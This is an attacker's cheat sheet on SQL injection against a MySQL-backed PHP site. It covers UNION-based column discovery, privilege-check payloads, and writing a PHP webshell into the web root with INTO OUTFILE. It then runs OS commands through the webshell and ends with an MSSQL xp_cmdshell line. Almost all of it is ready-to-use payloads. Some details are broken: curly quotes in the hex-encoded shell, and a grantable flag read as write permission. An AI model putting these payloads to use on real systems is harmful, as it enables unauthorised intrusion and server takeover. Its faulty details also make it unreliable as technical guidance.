# SQL Privilege Escalation

## Identifying the vulnerability

Let's suppose that the website has 12 columns and the given UNION Based SQL query shows that the vulnerable column is 4:  
```http://domain.com/index.php?id=1' Union Select 1,2,3,4,5,6,7,8,9,10,11,12-- -```

Payload used for Privilege Check via I_S.PRIVILEGES:  
```(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)```

Payload used for Privilege Check via MySQL System Table:  
```(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)```

Apply one of the queries into the 4th column:  
```http://domain.com/index.php?id=1' Union Select 1,2,3,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),5,6,7,8,9,10,11,12-- -```

Look into the results, if 'root'@'localhost' is YES, then we can perform Privilage Escalation (perform RCE). Else, if NO is shown we can't perform RCE since we don't have permission to write over the server/database.

## Escalating privileges

Since we have permission to write, we can create our own PHP Webshell, but to do this we need to know the absolute path of INDEX.

### Finding absolute path

The most common way is to perform a 'Fatal Error' or a Syntax Error and the absolute path will be shown bolded like the image below.
Note: different websites displayes different output and format.

![fatal_error_syntax](https://i.imgur.com/rAPKrh1.png)

The bold part is the absolute path: **E:\xampp\htdocs** which is converted to **E:/xampp/htdocs**

### Uploading webshell

Below is the PHP script converted to 0xHEX format:  
```0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d```

The converted PHP payload:  
```“<?php system($_GET[‘cmd’]); ?>”```

The given query is the final payload to upload our simple webshell into webshell.php

```http://domain.com/index.php?id=1' Union Select 1,2,3,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,5,6,7,8,9,10,11,12 into outfile 'E:/xampp/htdocs/webshell.php'-- -```

Since the webshell is upload, you can go execute OS Commands:

```http://domain.com/webshell.php?cmd=whoami```

## OS Command Execution

Via **xp_cmdshell**:  
```something'); exec xp_cmdshell "ping 10.10.x.x"--``` 
